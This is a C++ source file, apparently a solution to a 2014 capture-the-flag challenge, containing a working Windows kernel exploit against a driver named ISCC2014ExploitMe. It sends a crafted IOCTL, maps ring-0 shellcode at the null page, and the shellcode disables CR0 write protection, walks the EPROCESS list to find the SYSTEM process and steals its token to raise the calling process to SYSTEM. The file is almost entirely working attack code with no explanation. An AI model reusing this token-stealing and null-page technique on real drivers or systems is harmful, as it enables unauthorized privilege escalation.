// exploit.cpp : Defines the entry point for the console application.
//

#include <windows.h>
#include <stdio.h>
#include "ntapi.h"
#pragma comment(linker,"/defaultlib:ntdll.lib")  

#define PAGE_SIZE 0x1000
#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_OPEN_IF 0x00000003
#define KERNEL_NAME_LENGTH 0x0D

//触发漏洞使用的IoControlCode
//#define IOCTL_METHOD_NEITHER 0x8888A003
#define IOCTL_TEST1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

ULONG g_uCr0;
//Ring0中执行的Shellcode
NTSTATUS Ring0ShellCode(    
						ULONG InformationClass,
						ULONG BufferSize,
						PVOID Buffer,
						PULONG ReturnedLength)
{
	/*__asm
	{
		cli;
		mov eax, cr0;
		//mov g_uCr0,eax; 
		and eax,0xFFFEFFFF; 
		mov cr0, eax; 
	}
	*/
	__asm{
		cli
		mov eax, cr0
		mov g_uCr0, eax
		and eax, 0xFFFEFFFF
		mov cr0, eax

		mov eax, 0xffdff124
		mov eax, [eax]
		mov esi, [eax+0x220]
		mov eax, esi
	searchXp:
		mov eax, [eax+0x88]
		sub eax, 0x88
		mov edx, [eax+0x84]
		cmp edx, 0x4
		jne searchXp
		mov eax, [eax+0xc8]
		mov [esi+0xc8], eax

		
		sti
		mov eax, g_uCr0
		mov cr0, eax
	}

	return 0;
}  

//申请内存的函数
PVOID MyAllocateMemory(IN ULONG Length)
{
	NTSTATUS NtStatus;
	PVOID BaseAddress = NULL;
	NtStatus = NtAllocateVirtualMemory(
		NtCurrentProcess(),
		&BaseAddress,
		0,
		&Length,
		MEM_RESERVE |
		MEM_COMMIT,
		PAGE_READWRITE);
	if(NtStatus == STATUS_SUCCESS)
	{
		RtlZeroMemory(BaseAddress, Length);
		return BaseAddress;
	}
	return NULL;
}

//释放内存的函数
VOID MyFreeMemory(IN PVOID BaseAddress)
{
	NTSTATUS NtStatus;
	ULONG FreeSize = 0;
	NtStatus = NtFreeVirtualMemory(
		NtCurrentProcess(),
		&BaseAddress,
		&FreeSize,
		MEM_RELEASE);
}

//main函数
int main()
{
	NTSTATUS NtStatus;
	HANDLE DeviceHandle=NULL;
	ULONG ReturnLength = 0;
	PVOID MappedBase=NULL;
	ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
	ULONG ShellCodeSize = PAGE_SIZE;
	PVOID ShellCodeAddress;


	char DeviceName[] = "\\\\.\\ISCC2014ExploitMe";
	HANDLE handle = CreateFile(DeviceName, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if(handle == INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error:%d\n", GetLastError());
		goto ret;	
	}

	char InputData[69] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	InputData[5] = '\0';
	InputData[64]='\0';
	InputData[65]='\0';
	InputData[66]='\0';
	InputData[67]='\0';

	char OutputData[100];

	DWORD retlen;
	BOOL ret;
	ret= DeviceIoControl(handle, IOCTL_TEST1, (PVOID)InputData, 68, (PVOID)OutputData, 100, &retlen, NULL);
	if(!ret)
	{
		printf("DeviceIoControlFile failed:%d\n", GetLastError());
		goto ret;
	} 
	printf("%s, %d\n", OutputData, retlen);

	//在本进程空间申请0地址内存
	ShellCodeAddress = (PVOID)sizeof(ULONG);
	NtStatus = NtAllocateVirtualMemory(
		NtCurrentProcess(),      // ProcessHandle
		&ShellCodeAddress,       // BaseAddress
		0,                       // ZeroBits
		&ShellCodeSize,          // AllocationSize
		MEM_RESERVE | 
		MEM_COMMIT |
		MEM_TOP_DOWN,            // AllocationType
		PAGE_EXECUTE_READWRITE); // Protect
	if(NtStatus)
	{
		printf("NtAllocateVirtualMemory failed! NtStatus=%.8X\n", NtStatus);    
		goto ret;
	}
	printf("NtAllocateVirtualMemory succeed! ShellCodeAddress=%p\n", ShellCodeAddress); 

	//复制Ring0ShellCode到0地址内存中
	RtlMoveMemory(
		ShellCodeAddress,
		(PVOID)Ring0ShellCode,
		ShellCodeSize);


	ret= DeviceIoControl(handle, IOCTL_TEST1, (PVOID)InputData, 68, (PVOID)OutputData, 100, &retlen, NULL);
	if(!ret)
	{
		printf("DeviceIoControlFile failed:%d\n", GetLastError());
		goto ret;
	} 
	printf("%s, %d\n", OutputData, retlen);

	getchar();

ret:
	//关闭句柄
	if(handle)
	{
		BOOL closeRet = CloseHandle(handle);
		if(!closeRet)
		{
			printf("CloseHandle failed:%d\n", GetLastError());    
		}
	}
	return 0;
}

